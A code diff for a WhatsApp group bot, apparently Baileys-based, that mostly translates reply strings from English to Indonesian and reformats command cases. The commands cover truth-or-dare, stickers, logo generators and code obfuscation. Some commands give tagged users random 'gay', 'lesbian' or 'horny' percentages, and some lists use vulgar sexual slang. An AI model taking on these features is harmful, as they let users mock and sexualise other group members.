+    "Jika Anda harus menghapus satu aplikasi dari ponsel Anda, aplikasi mana yang akan dipilih",
+    "Aplikasi apa yang paling Anda buang waktu",
+    "Pernahkah kamu berpura-pura sakit untuk pulang sekolah",
+    "Barang apa yang paling memalukan di kamarmu",
+    "Lima barang apa yang akan kamu bawa jika kamu terjebak di pulau terpencil",
+    "Pernahkah kamu tertawa begitu keras hingga pipis di celana",
+    "Apakah kamu mencium bau kentutmu sendiri",
+    "apakah kamu pernah pipis di tempat tidur saat tidur ???",
+    "Apa kesalahan terbesar yang pernah kamu buat",
+    "Pernahkah kamu menyontek saat ujian",
+    "Apa hal terburuk yang pernah kamu lakukan",
+    "Kapan terakhir kali kamu menangis",
+    "siapa yang paling kamu cintai di antara orang tuamu",
+    "Apakah kamu kadang-kadang memasukkan jarimu ke dalam lubang hidung?",
+    "siapa yang kamu suka saat sekolah",
+    "Katakan dengan jujur, apakah kamu menyukai laki-laki di grup ini",
+    "apakah kamu pernah menyukai seseorang? sudah berapa lama?",
+    "apakah kamu punya gf/bf', 'apa ketakutan terbesarmu?",
+    "pernahkah kamu menyukai seseorang dan merasa orang itu juga menyukaimu?",
+    "Siapa nama mantan pacar temanmu yang pernah kamu sukai diam-diam?",
+    "pernahkah kamu mencuri uang ibumu atau uang ayahmu",
+    "apa yang membuatmu bahagia saat kamu sedih",
+    "apakah kamu menyukai seseorang yang ada digrup ini? kalau kamu lalu siapa?",
+    "apakah kamu pernah ditipu orang?",
+    "Siapakah orang yang paling penting dalam hidupmu",
+    "Hal membanggakan apa yang kamu dapatkan tahun ini",
+    "siapa orang yang bisa membuatmu bahagia saat kamu sedih",
+    "Siapakah orang yang pernah membuatmu merasa tidak nyaman",
+    "apakah kamu pernah berbohong kepada orang tuamu",
+    "kamu masih suka mantan kamu",
+    "dengan siapa kamu suka bermain bersama?",
+    "apakah kamu pernah mencuri barang besar dalam hidupmu? alasannya kenapa?",
+    "Sebutkan kejadian yang membuatmu terluka yang masih kamu ingat",
+    "prestasi apa yang kamu dapatkan tahun ini?",
+    "apa kebiasaan terburukmu di sekolah?",
+    "apakah Anda menyukai pembuat bot, NFS?",
+    "pernahkah kamu berpikir untuk membalas dendam dari gurumu?",
+    "apakah Anda menyukai perdana menteri negara Anda saat ini",
+    "Anda bukan sayuran atau sayuran",
+    "jika kamu bisa menjadi tidak terlihat, apa hal pertama yang akan kamu lakukan",
+    "rahasia apa yang kamu sembunyikan dari orang tuamu",
+    "Siapa naksir rahasiamu",
+    "siapa orang terakhir yang kamu creep di media sosial",
+    "Jika seorang jin mengabulkan tiga keinginanmu, apa yang akan kamu minta",
+    "Apa penyesalan terbesarmu",
+    "Menurutmu binatang apa yang paling mirip denganmu",
+    "Berapa banyak selfie yang kamu lakukan sehari",
+    "Apa acara masa kecil favoritmu",
+    "jika kamu bisa menjadi karakter fiksi selama sehari, siapa yang akan kamu pilih",
+    "siapa yang paling sering kamu SMS",
+    "Apa kebohongan terbesar yang pernah kamu katakan kepada orang tuamu",
+    "Siapa selebritas yang kamu sukai",
+    "Apa mimpi teraneh yang pernah kamu alami",
+    "Apakah Anda bermain pubg, jika Anda kemudian mengirimkan nomor id Anda"
 ]
               const NFStruth = truth[Math.floor(Math.random() * truth.length)]
               buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
-              NFSBotInc.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ NFStruth }, {quoted:m})
+              NFSBotInc.sendMessage(from, { image: buffertruth, caption: '_Anda memilih KEBENARAN_\n'+ NFStruth }, {quoted:m})
               break
 case 'checkme':
 					neme = args.join(" ")
 					bet = `${sender}`
-					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
-					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
+					var sifat = ['Bagus','Tidak ramah','Caper','Gila','Mengganggu','Bobrok','Orang pemarah','Sopan','Beban','Besar','Jijik','Pembohong','Otak Mesum']
+					var hoby = ['Memasak','Tarian','Bermain','Game','Lukisan','Membantu Orang Lain','Menonton anime','Membaca','Mengendarai sepeda','Bernyanyi','Mengobrol','Berbagi Meme','Menggambar','Makan Uang Orang Tua','Bermain Kebenaran atau Tantangan','Tinggal Sendiri','Coli','Colmek']
 					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
-					var cakep = ['Yes','No','Very Ugly','Very Handsome']
-					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
+					var cakep = ['Ya','TIDAK','Sangat jelek','Sangat tampan']
+					var wetak= ['Merawat','Dermawan','Orang pemarah','PeMaaf','Penurut','Bagus','Saya minta maaf','Baik Hati','Sabar','UwU','Top','Bermanfaat']
 					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
@@ -4137,18 +4129,18 @@ case 'checkme':
 					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
 					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*
 
-*Name :* ${pushname}
-*Characteristic :* ${sipat}
-*Hobby :* ${biho}
-*Simp :* ${bhucin}%
-*Great :* ${senga}%
-*Handsome :* ${chakep}
-*Character :* ${watak}
-*Good Morals :* ${baik}%
-*Bad Morals :* ${burug}%
-*Intelligence :* ${cerdas}%
-*Courage :* ${berani}%
-*Afraid :* ${takut}%
+*Nama :* ${pushname}
+*Sifat :* ${sipat}
+*Hobi :* ${biho}
+*Kebucinan :* ${bhucin}%
+*Besar :* ${senga}%
+*Ketampan :* ${chakep}
+*Karakter :* ${watak}
+*Tingkat Moral :* ${baik}%
+*Keburukan Moral :* ${burug}%
+*Kecerdasan :* ${cerdas}%
+*Keberanian :* ${berani}%
+*Ketakutan :* ${takut}%
 
 *≡═══《 CHECK PROPERTIES 》═══≡*`
 					buff = await getBuffer(defaultpp)
@@ -4159,7 +4151,7 @@ case 'toimg': {
 	const getRandom = (ext) => {
             return `${Math.floor(Math.random() * 10000)}${ext}`
         }
-        if (!m.quoted) return replygcNFS(`_Reply to Any Sticker._`)
+        if (!m.quoted) return replygcNFS(`_Balas ke Setiap Stiker._`)
         let mime = m.quoted.mtype
 if (mime =="imageMessage" || mime =="stickerMessage")
 {
@@ -4172,12 +4164,12 @@ if (mime =="imageMessage" || mime =="stickerMessage")
 fs.unlinkSync(name)
         })
         
-} else return replygcNFS(`Please reply to non animated sticker`)
+} else return replygcNFS(`Harap balas stiker bukan animasi`)
     }
     break
 case 'swm': case 'steal': case 'stickerwm': case 'take':{
 if (!isPrem) return replyprem(mess.premium)
-if (!args.join(" ")) return replygcNFS(`Where is the text?`)
+if (!args.join(" ")) return replygcNFS(`Dimana teksnya?`)
 const swn = args.join(" ")
 const pcknm = swn.split("|")[0]
 const atnm = swn.split("|")[1]
@@ -4188,17 +4180,17 @@ NFSBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
 let media = await quoted.download()
 let encmedia = await NFSBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
 } else if (/video/.test(mime)) {
-if ((quoted.msg || quoted).seconds > 11) return replygcNFS('Maximum 10 Seconds!')
+if ((quoted.msg || quoted).seconds > 11) return replygcNFS('Maksimal 10 Detik!')
 let media = await quoted.download()
 let encmedia = await NFSBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
 } else {
-replygcNFS(`Photo/Video?`)
+replygcNFS(`Foto/Video?`)
 }
 }
 break
 case 'qc': case'text': {
     if (!args[0] && !m.quoted) {
-      return replygcNFS(`Where is the text?`)
+      return replygcNFS(`Dimana teksnya?`)
     }
     let userPfp
     if (m.quoted) {
@@ -4254,144 +4246,78 @@ case 'qc': case'text': {
     }
     }
     break
-case 's': case 'sticker': case 'stiker': {
-if (!quoted) return replygcNFS(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
+case 'sticker': case 'stiker': {
+if (!quoted) return replygcNFS(`Kirim/Balas Gambar/Video/Gif Dengan Teks ${prefix+command}\nDurasi Video 1-9 Detik`)
 if (/image/.test(mime)) {
 let media = await quoted.download()
 let encmedia = await NFSBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 
 } else if (/video/.test(mime)) {
-if ((quoted.msg || quoted).seconds > 11) return replygcNFS('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
+if ((quoted.msg || quoted).seconds > 11) return replygcNFS('Kirim/Balas Gambar/Video/Gif Dengan Teks ${prefix+command}\nDurasi Video 1-9 Detik')
 let media = await quoted.download()
 let encmedia = await NFSBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 
 } else {
-replygcNFS(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
+replygcNFS(`Kirim/Balas Gambar/Video/Gif Dengan Teks ${prefix+command}\nDurasi Video 1-9 Detik`)
 }
 }
 break
 case 'quotes':
 const quoteNFSy = await axios.get(`https://favqs.com/api/qotd`)
-        const textquotes = `*${themeemoji} Quote:* ${quoteNFSy.data.quote.body}\n\n*${themeemoji} Author:* ${quoteNFSy.data.quote.author}`
+        const textquotes = `*${themeemoji} Quote:* ${quoteNFSy.data.quote.body}\n\n*${themeemoji} Pengarang:* ${quoteNFSy.data.quote.author}`
 return replygcNFS(textquotes)
 break
 case 'handsomecheck':
-				if (!text) return replygcNFS(`Tag Someone, Example : ${prefix + command} @NFS`)
+				if (!text) return replygcNFS(`Menandai seseorang, Contoh : ${prefix + command} @NFS`)
 					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 					const teng = gan[Math.floor(Math.random() * gan.length)]
-NFSBotInc.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
+NFSBotInc.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nMenjawab : *${teng}%*` }, { quoted: m })
 					break
 case 'beautifulcheck':
-				if (!text) return replygcNFS(`Tag Someone, Example : ${prefix + command} @NFS`)
+				if (!text) return replygcNFS(`Tag Seseorang, Contoh : ${prefix + command} @NFS`)
 					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 					const tik = can[Math.floor(Math.random() * can.length)]
-NFSBotInc.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
+NFSBotInc.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nMenjawab : *${tik}%*` }, { quoted: m })
 					break
 					case 'charactercheck':
-					if (!text) return replygcNFS(`Tag Someone, Example : ${prefix + command} @NFS`)
-					const NFSy =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
+					if (!text) return replygcNFS(`Tag Seseorang, Contoh : ${prefix + command} @NFS`)
+					const NFSy =['Penuh kasih','Dermawan','Pemarah','Pemaaf','Patuh','Bagus','Orang bodoh','Baik hati','sabar','Wow','puncak, pokoknya','Bermanfaat']
 					const taky = NFSy[Math.floor(Math.random() * NFSy.length)]
-					NFSBotInc.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
+					NFSBotInc.sendMessage(from, { text: `Pemeriksaan Karakter : ${q}\nMenjawab : *${taky}*` }, { quoted: m })
 				     break
-case 'awesomecheck':
-  case 'greatcheck':
-    case 'gaycheck':
-      case 'cutecheck':
-        case 'lesbicheck':
-          case 'lesbiancheck':
-             case 'hornycheck':
-                 case 'prettycheck':
-                    case 'lovelycheck':
-                      case 'uglycheck':
+case 'awesomecheck': case 'greatcheck': case 'gaycheck': case 'cutecheck': case 'lesbicheck': case 'lesbiancheck': case 'hornycheck': case 'prettycheck': case 'lovelycheck': case 'uglycheck':
 if (!m.isGroup) return NFSStickGroup()
 const cex = body.slice(0)
 const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
 if (mentionByReply) {
-NFSBotInc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
+NFSBotInc.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nPemeriksa : ' + `@${mentionByReply.split('@')[0]}` + '\nMenjawab : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
 } else if (mentionByTag[0] && isGroup) {
-NFSBotInc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
+NFSBotInc.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nPemeriksa : ' + `@${mentionByTag[0].split('@')[0]}` + '\nMenjawab : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
 } else if (!mentionByReply && !mentionByTag[0]) {
-NFSBotInc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
+NFSBotInc.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nPemeriksa : ' + `@${sender.split('@')[0]}` + '\nMenjawab : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
 }
 break
 case 'obfus': case 'obfuscate':{
-if (!q) return replygcNFS(`Example ${prefix+command} const NFSbot = require('baileys')`)
+if (!q) return replygcNFS(`*Contoh* ${prefix+command} lanjutan NFSbot = require('baileys')`)
 let meg = await obfus(q)
-replygcNFS(`Success
+replygcNFS(`Berhasil
 ${meg.result}`)
 }
 break
 case 'style': case 'styletext': {
 		let { styletext } = require('./lib/scraper')
-		if (!text) return replygcNFS('Enter Query text!')
+		if (!text) return replygcNFS('Masukkan teks Kueri!')
                 let anu = await styletext(text)
-                let teks = `Style Text From ${text}\n\n`
+                let teks = `Gaya Teks Dari ${text}\n\n`
                 for (let i of anu) {
                     teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                 }
                 replygcNFS(teks)
 	    }
 	    break
-case 'candy': 
-case 'christmas': 
-case '3dchristmas': 
-case 'sparklechristmas':
-case 'deepsea': 
-case 'scifi': 
-case 'rainbow': 
-case 'waterpipe': 
-case 'spooky': 
-case 'pencil': 
-case 'circuit': 
-case 'discovery': 
-case 'metalic': 
-case 'fiction': 
-case 'demon': 
-case 'transformer': 
-case 'berry': 
-case 'thunder': 
-case 'magma': 
-case '3dstone': 
-case 'neonlight': 
-case 'glitch': 
-case 'harrypotter': 
-case 'brokenglass': 
-case 'papercut': 
-case 'watercolor': 
-case 'multicolor': 
-case 'neondevil': 
-case 'underwater': 
-case 'graffitibike':
-case 'snow': 
-case 'cloud': 
-case 'honey': 
-case 'ice': 
-case 'fruitjuice': 
-case 'biscuit': 
-case 'wood': 
-case 'chocolate': 
-case 'strawberry': 
-case 'matrix': 
-case 'blood': 
-case 'dropwater': 
-case 'toxic': 
-case 'lava': 
-case 'rock': 
-case 'bloodglas': 
-case 'hallowen': 
-case 'darkgold': 
-case 'joker': 
-case 'wicker':
-case 'firework': 
-case 'skeleton': 
-case 'blackpink': 
-case 'sand': 
-case 'glue': 
-case '1917': 
-case 'leaves': {
-
-if (!q) return replygcNFS(`Example : ${prefix+command} NFSBotInc`) 
+case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas': case 'deepsea': case 'scifi': case 'rainbow': case 'waterpipe': case 'spooky': case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dstone': case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike': case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': case 'lava': case 'rock': case 'bloodglas': case 'hallowen': case 'darkgold': case 'joker': case 'wicker':case 'firework': case 'skeleton': case 'blackpink': case 'sand': case 'glue': case '1917': case 'leaves': {
+if (!q) return replygcNFS(`*Contoh :* ${prefix+command} NFSBotInc`) 
 NFSStickWait()
 let link
 if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
@@ -4455,38 +4381,8 @@ let anu = await textpro.textpro(link, q)
 NFSBotInc.sendMessage(m.chat, { image: { url: anu }, caption: `${mess.success}` }, { quoted: m })
 }
 break
-case 'glitchtext':
-case 'writetext':
-case 'advancedglow':
-case 'typographytext':
-case 'pixelglitch':
-case 'neonglitch':
-case 'flagtext':
-case 'flag3dtext':
-case 'deletingtext':
-case 'blackpinkstyle':
-case 'glowingtext':
-case 'underwatertext':
-case 'logomaker':
-case 'cartoonstyle':
-case 'papercutstyle':
-case 'watercolortext':
-case 'effectclouds':
-case 'blackpinklogo':
-case 'gradienttext':
-case 'summerbeach':
-case 'luxurygold':
-case 'multicoloredneon':
-case 'sandsummer':
-case 'galaxywallpaper':
-case '1917style':
-case 'makingneon':
-case 'royaltext':
-case 'freecreate':
-case 'galaxystyle':
-case 'lighteffects':{
-
-if (!q) return replygcNFS(`Example : ${prefix+command} NFSBotInc`) 
+case 'glitchtext': case 'writetext': case 'advancedglow': case 'typographytext': case 'pixelglitch': case 'neonglitch': case 'flagtext': case 'flag3dtext': case 'deletingtext': case 'blackpinkstyle': case 'glowingtext': case 'underwatertext': case 'logomaker': case 'cartoonstyle': case 'papercutstyle': case 'watercolortext': case 'effectclouds': case 'blackpinklogo': case 'gradienttext': case 'summerbeach': case 'luxurygold': case 'multicoloredneon': case 'sandsummer': case 'galaxywallpaper': case '1917style': case 'makingneon': case 'royaltext': case 'freecreate': case 'galaxystyle': case 'lighteffects':{
+if (!q) return replygcNFS(`*Contoh :* ${prefix+command} NFSBotInc`) 
 NFSStickWait()
 let link
 if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
@@ -4523,35 +4419,8 @@ let haldwhd = await ephoto(link, q)
 NFSBotInc.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
 }
 break
-case 'shadow': 
-case 'write': 
-case 'romantic': 
-case 'burnpaper':
-case 'smoke': 
-case 'narutobanner': 
-case 'love': 
-case 'undergrass':
-case 'doublelove': 
-case 'coffecup':
-case 'underwaterocean':
-case 'smokyneon':
-case 'starstext':
-case 'rainboweffect':
-case 'balloontext':
-case 'metalliceffect':
-case 'embroiderytext':
-case 'flamingtext':
-case 'stonetext':
-case 'writeart':
-case 'summertext':
-case 'wolfmetaltext':
-case 'nature3dtext':
-case 'rosestext':
-case 'naturetypography':
-case 'quotesunder':
-case 'shinetext':{
-
-if (!q) return replygcNFS(`Example : ${prefix+command} NFSBotInc`) 
+case 'shadow': case 'write': case 'romantic': case 'burnpaper': case 'smoke': case 'narutobanner': case 'love': case 'undergrass': case 'doublelove': case 'coffecup': case 'underwaterocean': case 'smokyneon': case 'starstext': case 'rainboweffect': case 'balloontext': case 'metalliceffect': case 'embroiderytext': case 'flamingtext': case 'stonetext': case 'writeart': case 'summertext': case 'wolfmetaltext': case 'nature3dtext': case 'rosestext': case 'naturetypography': case 'quotesunder': case 'shinetext':{
+if (!q) return replygcNFS(`*Contoh :* ${prefix+command} NFSBotInc`) 
 NFSStickWait()
 let link
 if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
@@ -4586,7 +4455,7 @@ NFSBotInc.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.success}`
 }
 break
 case 'pornhub':{
-if(!q) return replygcNFS(`Example: ${prefix + command} ajg | ea`)
+if(!q) return replygcNFS(`*Contoh :* ${prefix + command} porn | Hub`)
 NFSStickWait()
   inilogo4 = args.join(" ")
 inilogo9 = args.join(" ")
@@ -4594,11 +4463,11 @@ inilogo9 = args.join(" ")
 var logo9 = inilogo9.split('|')[1]
     let anuphub = await textpro2("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [`${logo4}`,`${logo9}`])
 console.log(anuphub)
-NFSBotInc.sendMessage(from,{image:{url:anuphub}, caption:"Here you go!"},{quoted:m})
+NFSBotInc.sendMessage(from,{image:{url:anuphub}, caption:"Ini dia!"},{quoted:m})
 }
 break
 case 'retro':{
-if(!q) return replygcNFS(`Example: ${prefix + command} ajg | ea`)
+if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg | ea`)
 NFSStickWait()
   inilogo4 = args.join(" ")
 inilogo9 = args.join(" ")
@@ -4606,11 +4475,11 @@ inilogo9 = args.join(" ")
 var logo9 = inilogo9.split('|')[1]
     let anutro2 = await textpro2("https://textpro.me/create-3d-retro-text-effect-online-free-1065.html", [`${logo4}`,`${logo9}`])
 console.log(anutro2)
-NFSBotInc.sendMessage(from,{image:{url:anutro2}, caption:"Here you go!"},{quoted:m})
+NFSBotInc.sendMessage(from,{image:{url:anutro2}, caption:"Ini dia!"},{quoted:m})
 }
 break
 case '8bit':{
-if(!q) return replygcNFS(`Example: ${prefix + command} ajg | ea`)
+if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg | ea`)
 NFSStickWait()
   inilogo4 = args.join(" ")
 inilogo9 = args.join(" ")
@@ -4618,137 +4487,137 @@ inilogo9 = args.join(" ")
 var logo9 = inilogo9.split('|')[1]
     let anubit8 = await textpro2("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [`${logo4}`,`${logo9}`])
 console.log(anubit8)
-NFSBotInc.sendMessage(from,{image:{url:anubit8}, caption:"Here you go!"},{quoted:m})
+NFSBotInc.sendMessage(from,{image:{url:anubit8}, caption:"Ini dia!"},{quoted:m})
 }
 break
 case 'batman':
-if(!q) return replygcNFS(`Example: ${prefix + command} ajg`)
+if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
 NFSStickWait()
 maker.textpro("https://textpro.me/make-a-batman-logo-online-free-1066.html", [
     `${q}`,])
-  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err))
    break
 case '3dbox':
-if(!q) return replygcNFS(`Example: ${prefix + command} ea`)
+if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ea`)
 NFSStickWait()
 maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
     `${q}`,])
-.then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+.then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
 .catch((err) => console.log(err));
 break
 case 'lion':
-  if(!q) return replygcNFS(`Example: ${prefix + command} ajg`)
+  if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
 NFSStickWait()
   maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
       `${q}`,])
-     .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+     .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
      .catch((err) => console.log(err));
      break
 case '3davengers':
-if(!q) return replygcNFS(`Example: ${prefix + command} ajg`)
+if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
 NFSStickWait()
 maker.textpro("https://textpro.me/create-3d-avengers-logo-online-974.html", [
     `${q}`,])
-  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break 
 case 'window':
-if(!q) return replygcNFS(`Example: ${prefix + command} ajg`)
+if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
 NFSStickWait()
 maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
     `${q}`,])
-  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case '3dspace':
-if(!q) return replygcNFS(`Example: ${prefix + command} ajg | ea`)
+if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg | ea`)
 NFSStickWait()
 teks1 = q.split("|")[0]
 teks2 = q.split("|")[1]
 maker.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
     `${teks1}`,`${teks2}`])
-  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'bokeh':
-if(!q) return replygcNFS(`Example: ${prefix + command} ajg`)
+if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
 NFSStickWait()
 maker.textpro("https://textpro.me/bokeh-text-effect-876.html", [
     `${q}`,])
-  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'holographic':
-if(!q) return replygcNFS(`Example: ${prefix + command} ajg`)
+if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
 NFSStickWait()
 maker.textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
     `${q}`,])
-  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'thewall':
-if(!q) return replygcNFS(`Example: ${prefix + command} ajg`)
